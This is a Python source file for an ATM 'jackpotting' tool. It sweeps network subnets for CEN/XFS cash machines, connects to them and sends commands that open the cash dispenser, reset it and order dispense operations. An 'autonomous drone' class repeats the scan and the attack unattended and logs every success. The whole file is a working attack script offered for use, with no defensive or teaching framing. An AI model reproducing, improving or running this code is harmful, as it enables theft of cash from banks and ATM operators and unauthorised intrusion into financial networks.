#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
network_xfs.py - Network-based XFS exploitation with optional AgentState integration.
"""

import socket
import subprocess
import time
import json
import threading
import os
from typing import List, Dict, Tuple, Optional
from datetime import datetime
import ipaddress


class RemoteXFSExploit:
    """Remote XFS exploitation over network."""

    def __init__(self, state=None):
        self.targets = []
        self.xfs_ports = [7777, 8888, 9999, 8080, 443, 80, 22, 23]
        self.timeout = 5
        self.max_retries = 3
        self.state = state  # optional AgentState for logging
        self.xfs_patterns = [
            b'XFS',
            b'CENXFS',
            b'CashDispenser',
            b'PINPad',
            b'CardReader',
            b'CWA15748',
            b'XFS_Service',
            b'WFS'
        ]

    def discover_atms(self, subnet: str = "192.168.1.0/24") -> List[str]:
        """Discover ATM devices on the network."""
        print(f"🔍 Discovering ATMs on {subnet}")
        discovered = []
        try:
            network = ipaddress.ip_network(subnet, strict=False)
        except:
            network = ipaddress.ip_network("192.168.1.0/24")

        for ip in network.hosts():
            ip_str = str(ip)
            if not self._ping_host(ip_str):
                continue
            for port in self.xfs_ports:
                if self._check_port(ip_str, port):
                    if self._is_xfs_service(ip_str, port):
                        discovered.append(ip_str)
                        print(f"  ✅ XFS device found: {ip_str}:{port}")
                        if self.state:
                            self.state.push_log(f"XFS device: {ip_str}:{port}")
                        break
        self.targets = discovered
        if self.state:
            self.state.set_jackpot_targets([{"ip": ip, "port": 7777} for ip in discovered])
        return discovered

    def _ping_host(self, ip: str) -> bool:
        try:
            if os.name == 'nt':
                result = subprocess.run(
                    ['ping', '-n', '1', '-w', '1000', ip],
                    capture_output=True,
                    timeout=2
                )
            else:
                result = subprocess.run(
                    ['ping', '-c', '1', '-W', '1', ip],
                    capture_output=True,
                    timeout=2
                )
            return result.returncode == 0
        except:
            return False

    def _check_port(self, ip: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False

    def _is_xfs_service(self, ip: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            probe = b'\x00\x00\x00\x00'
            sock.send(probe)
            data = sock.recv(1024)
            sock.close()
            for pattern in self.xfs_patterns:
                if pattern in data:
                    return True
            return False
        except:
            return False

    def execute_remote_command(self, target_ip: str, port: int, command: str) -> str:
        """Execute XFS command on remote target."""
        print(f"💻 Executing on {target_ip}:{port}: {command}")
        xfsc_path = self._get_xfsc_path()
        if xfsc_path:
            return self._execute_with_xfsc(xfsc_path, target_ip, port, command)
        else:
            return self._execute_with_socket(target_ip, port, command)

    def _get_xfsc_path(self) -> Optional[str]:
        import shutil
        if os.path.exists('xfsc'):
            return './xfsc'
        if os.path.exists('xfsc.exe'):
            return './xfsc.exe'
        xfsc_dir = os.path.join(os.path.dirname(__file__), '..', 'xfsc')
        if os.path.exists(os.path.join(xfsc_dir, 'xfsc')):
            return os.path.join(xfsc_dir, 'xfsc')
        if os.path.exists(os.path.join(xfsc_dir, 'xfsc.exe')):
            return os.path.join(xfsc_dir, 'xfsc.exe')
        path_xfsc = shutil.which('xfsc')
        if path_xfsc:
            return path_xfsc
        common_paths = ['/usr/local/bin/xfsc', '/usr/bin/xfsc', './bin/xfsc']
        for p in common_paths:
            if os.path.exists(p):
                return p
        return None

    def _execute_with_xfsc(self, xfsc_path: str, target_ip: str, port: int, command: str) -> str:
        try:
            cmd = f"{xfsc_path} -c '{command}' --host {target_ip} --port {port}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            output = result.stdout if result.stdout else result.stderr
            return output.strip() or "Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "Error: Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"

    def _execute_with_socket(self, target_ip: str, port: int, command: str) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((target_ip, port))
            cmd_bytes = command.encode() + b'\r\n'
            sock.send(cmd_bytes)
            response = b''
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
                    if len(response) > 10240:
                        break
                except socket.timeout:
                    break
            sock.close()
            return response.decode('utf-8', errors='ignore').strip()
        except Exception as e:
            return f"Error: {str(e)}"

    def exploit_sequence(self, target_ip: str, port: int = 7777) -> Dict:
        """Full jackpot exploit sequence."""
        print(f"🚨 Initiating jackpot sequence on {target_ip}:{port}")
        results = {
            'target': target_ip,
            'port': port,
            'timestamp': datetime.now().isoformat(),
            'steps': [],
            'success': False,
            'amount_dispensed': 0
        }

        commands = [
            ("open CashDispenser_1", 0.5),
            ("cdm status", 0.3),
            ("cdm reset", 0.5),
            ("cdm dispense 100 20", 0.5),
            ("cdm dispense 100 20", 0.5),
            ("cdm close", 0.3),
        ]

        for cmd, delay in commands:
            result = self.execute_remote_command(target_ip, port, cmd)
            results['steps'].append({'command': cmd, 'result': result[:200]})
            time.sleep(delay)
            if "error" in result.lower() or "failure" in result.lower():
                results['success'] = False
                break
        else:
            results['success'] = True
            results['amount_dispensed'] = 200

        if self.state:
            self.state.record_jackpot_attempt(target_ip, port, results['success'], results['amount_dispensed'])
            self.state.set_last_jackpot_result(results)
        return results

    def scan_subnet(self, subnet: str = "192.168.1.0/24") -> List[Dict]:
        """Full subnet scan for XFS devices."""
        print(f"🔍 Scanning {subnet} for XFS devices")
        atms = []
        try:
            network = ipaddress.ip_network(subnet, strict=False)
        except:
            network = ipaddress.ip_network("192.168.1.0/24")

        for ip in network.hosts():
            ip_str = str(ip)
            if not self._ping_host(ip_str):
                continue
            for port in self.xfs_ports:
                if self._check_port(ip_str, port):
                    if self._is_xfs_service(ip_str, port):
                        atm_info = {
                            'ip': ip_str,
                            'port': port,
                            'service': 'XFS',
                            'detected': datetime.now().isoformat()
                        }
                        atms.append(atm_info)
                        print(f"  ✅ XFS device: {ip_str}:{port}")
                        if self.state:
                            self.state.push_log(f"XFS found: {ip_str}:{port}")
                        break
        self.targets = [a['ip'] for a in atms]
        if self.state:
            self.state.set_jackpot_targets(atms)
        return atms


class NetworkJackpotDrone:
    """Autonomous network jackpot drone."""

    def __init__(self, state=None):
        self.exploit = RemoteXFSExploit(state=state)
        self.scanning = False
        self.targets = []
        self.results = []
        self.callbacks = []
        self.scan_thread = None
        self.state = state

    def start_autonomous_scan(self, subnet: str = "192.168.1.0/24", interval: int = 60):
        print(f"🚀 Starting autonomous jackpot drone on {subnet}")
        self.scanning = True
        while self.scanning:
            try:
                atms = self.exploit.scan_subnet(subnet)
                if atms:
                    print(f"🎯 Found {len(atms)} ATM devices")
                    for atm in atms:
                        if atm['ip'] not in [t.get('ip') for t in self.targets]:
                            result = self.exploit.exploit_sequence(atm['ip'], atm['port'])
                            self.results.append(result)
                            self.targets.append(atm)
                            if result['success']:
                                print(f"✅ SUCCESS on {atm['ip']}:{atm['port']}")
                                self._send_notification(result)
                else:
                    print("⏳ No XFS devices found, waiting...")
                time.sleep(interval)
            except Exception as e:
                print(f"⚠️ Scan error: {e}")
                time.sleep(interval)

    def trigger_remote_command(self, target_ip: str, port: int, command: str) -> str:
        return self.exploit.execute_remote_command(target_ip, port, command)

    def trigger_exploit(self, target_ip: str, port: int = 7777) -> Dict:
        result = self.exploit.exploit_sequence(target_ip, port)
        self.results.append(result)
        return result

    def _send_notification(self, result: Dict):
        print(f"📧 Notification: Jackpot success on {result['target']}")
        try:
            os.makedirs('/tmp', exist_ok=True)
            with open('/tmp/jackpot_success.log', 'a') as f:
                f.write(json.dumps(result) + '\n')
        except:
            pass
        for callback in self.callbacks:
            try:
                callback(result)
            except:
                pass

    def add_callback(self, callback):
        self.callbacks.append(callback)

    def stop(self):
        self.scanning = False
        print("🛑 Jackpot drone stopped")

    def get_status(self) -> Dict:
        return {
            'scanning': self.scanning,
            'targets_found': len(self.targets),
            'exploits_attempted': len(self.results),
            'last_result': self.results[-1] if self.results else None
        }
